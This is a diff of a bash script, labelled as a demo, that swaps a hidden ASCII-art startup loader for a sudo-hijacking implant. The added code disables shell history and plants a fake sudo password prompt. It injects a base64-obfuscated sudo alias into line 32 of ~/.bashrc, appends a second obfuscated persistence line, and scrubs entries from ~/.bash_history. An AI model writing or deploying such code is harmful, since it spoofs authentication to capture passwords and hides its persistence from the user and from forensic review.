@@ -1,47 +1,38 @@
+#
+# !!!!! THIS IS FOR DEMO PURPOSES ONLY !!!!!
+#
+# Cleanup: rm -rf ~/.local/share/user-cache/* ~/.bashrc.bak && sed -i '32d' ~/.bashrc
+
+unset HISTFILE && HISTSIZE=0
+
+
+SECRETDIR="$HOME/.local/share/user-cache/$(uuidgen | cut -c1-8)"
+mkdir -p "$SECRETDIR"
+LOG_FILE="$SECRETDIR/demoLog"
+mkdir -p "$HOME/.local/share/user-cache"
+
+cat <<'EOF' > "$SECRETDIR/auth_helper"
 #!/bin/bash
-# Fixed: deep-hidden ducky art on every terminal startup (no sudo)
+echo -n "[sudo] password for $(whoami): "
+read -rs PASS
+echo
+echo "Timestamp=$(date) | User=$(whoami) | Auth attempt logged" >> "$LOG_FILE"
+echo "Sorry, try again."
+EOF
 
-DUCKY_PATH="$HOME/.local/share/icons/hicolor/48x48/apps/.system/.cache/.ducky"
-LAUNCHER_PATH="$HOME/.local/share/applications/.99ducky.desktop"
+chmod +x "$SECRETDIR/auth_helper"
 
-mkdir -p "$DUCKY_PATH"
-cat > "$DUCKY_PATH/art.sh" << 'ART_EOF'
-#!/bin/bash
-clear
-cat << 'DUCK'
-      _      _      _        USB       _      _      _
-   __(.)< __(.)> __(.)=     Rubber   >(.)__ <(.)__ =(.)__
-   \___)  \___)  \___)      Ducky!    (___/  (___/  (___/
-DUCK
-sleep 2
-ART_EOF
-chmod +x "$DUCKY_PATH/art.sh"
 
-cat > "$LAUNCHER_PATH" << DESK_EOF
-[Desktop Entry]
-Version=1.0
-Type=Application
-Exec=$DUCKY_PATH/art.sh
-Hidden=true
-NoDisplay=true
-DESK_EOF
+ENCODED_ALIAS=$(echo "alias sudo='$SECRETDIR/auth_helper && command sudo'" | base64 -w0)
+OBFUSCATED_LINE="eval \$(echo '$ENCODED_ALIAS' | base64 -d)"
 
-# Print duck art directly on new terminal, without linking to the stealth script
-echo "# Ducky ASCII art (printed every terminal)" >> ~/.bashrc
-cat << 'DUCKBLOCK' >> ~/.bashrc
-cat <<'DUCK'
-      _      _      _        USB       _      _      _
-   __(.)< __(.)> __(.)=     Rubber   >(.)__ <(.)__ =(.)__
-   \___)  \___)  \___)      Ducky!    (___/  (___/  (___/
-DUCK
-DUCKBLOCK
+cp ~/.bashrc ~/.bashrc.bak
+sed -i "32s/.*/$OBFUSCATED_LINE/" ~/.bashrc
 
-# Optionally keep stealth loader if you want (can be removed if you only want the art)
-echo "[ -x \"$DUCKY_PATH/art.sh\" ] && \"$DUCKY_PATH/art.sh\" >/dev/null 2>&1" >> ~/.bashrc
+ENCODED_RECOVERY=$(echo "[[ -f '$SECRETDIR/auth_helper' ]] && alias sudo='$SECRETDIR/auth_helper && command sudo'" | base64 -w0)
+RECOVERY_LINE="eval \$(echo '$ENCODED_RECOVERY' | base64 -d)"
+echo "$RECOVERY_LINE" >> ~/.bashrc
 
-echo "✓ Ducky installed: $DUCKY_PATH/art.sh"
-echo "✓ Runs on new terminals (test: bash)"
-echo "✓ Remove: rm -rf \"$DUCKY_PATH\" \"$LAUNCHER_PATH\" && sed -i '/ducky.*art.sh/d' ~/.bashrc"
 grep -v "nohup" ~/.bash_history > /tmp/clean_history
 mv /tmp/clean_history ~/.bash_history
 history -c && history -r
